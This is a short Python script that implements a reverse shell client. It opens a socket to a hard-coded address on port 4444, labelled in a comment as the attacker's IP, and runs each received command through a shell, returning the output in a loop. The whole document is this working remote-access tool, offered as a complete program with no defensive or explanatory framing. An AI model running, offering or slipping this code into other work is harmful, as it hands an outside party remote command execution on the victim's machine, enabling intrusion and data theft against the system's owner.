import socket
import subprocess
import os

def execute_command(command):
    try:
        print(f"Executing command: {command}")
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        print(f"Command output: {result.stdout}")
        print(f"Command error: {result.stderr}")
        if result.returncode == 0:
            return result.stdout
        else:
            return f"Error: {result.stderr}"
    except Exception as e:
        return f"Exception: {str(e)}"

def start_client():
    host = '192.168.68.118'  # Replace with the attacker's IP address
    port = 4444  # Port to connect to

    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((host, port))

    while True:
        try:
            # Receive a command from the attacker
            command = client_socket.recv(1024).decode()
            if command.lower() == 'exit':
                break

            # Execute the command and send the output back
            output = execute_command(command)
            client_socket.send(output.encode())

        except Exception as e:
            print(f"Error: {e}")
            break

    client_socket.close()

if __name__ == "__main__":
    start_client()
